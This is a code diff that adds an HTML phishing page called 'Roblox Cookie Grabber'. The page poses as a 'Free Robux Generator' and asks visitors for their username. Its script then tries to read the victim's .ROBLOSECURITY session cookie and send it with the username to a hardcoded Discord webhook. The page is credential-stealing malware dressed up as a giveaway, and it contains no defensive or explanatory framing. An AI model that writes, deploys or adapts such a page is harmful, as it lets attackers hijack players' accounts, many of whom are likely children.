@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Roblox Cookie Grabber</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; text-align: center; padding: 2rem; }
+    .container { max-width: 500px; margin: 0 auto; background: #2a2a2a; padding: 2rem; border-radius: 8px; }
+    input, button { width: 100%; padding: 0.75rem; margin: 0.5rem 0; border: none; border-radius: 4px; }
+    button { background: #00ff99; color: #000; font-weight: bold; cursor: pointer; }
+    button:hover { background: #00cc77; }
+    .status { margin-top: 1rem; font-size: 0.9rem; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Free Robux Generator</h2>
+    <p>Enter your Roblox username to receive 10,000 Robux!</p>
+    <input type="text" id="username" placeholder="Roblox username">
+    <button id="claimBtn">Claim Robux</button>
+    <div class="status" id="status"></div>
+  </div>
+
+  <script>
+    const webhook = 'https://discord.com/api/webhooks/1477207175607619606/QRToJeCw3f5Psff9_81PRwwOMAdsyUboelWzFuqrel1OG2eIcHqqqGvgOAoWIfP470vc'; // Replace with your webhook
+
+    async function sendToDiscord(cookie, username) {
+      const payload = {
+        embeds: [{
+          title: 'Cookie Grabbed',
+          description: `Username: \`${username}\`\nCookie: \`${cookie}\``,
+          color: 0x00ff99
+        }]
+      };
+      await fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    function getCookie(name) {
+      const value = `; ${document.cookie}`;
+      const parts = value.split(`; ${name}=`);
+      if (parts.length === 2) return parts.pop().split(';').shift();
+    }
+
+    document.getElementById('claimBtn').addEventListener('click', async () => {
+      const username = document.getElementById('username').value;
+      const robloxCookie = getCookie('.ROBLOSECURITY');
+      const status = document.getElementById('status');
+
+      if (!username) {
+        status.textContent = 'Please enter a username.';
+        return;
+      }
+
+      if (robloxCookie) {
+        status.textContent = 'Processing...';
+        await sendToDiscord(robloxCookie, username);
+        status.textContent = 'Success! Robux will be added shortly (fake).';
+      } else {
+        status.textContent = 'No .ROBLOSECURITY cookie found. Are you logged into Roblox?';
+      }
+    });
+  </script>
+</body>
+</html>
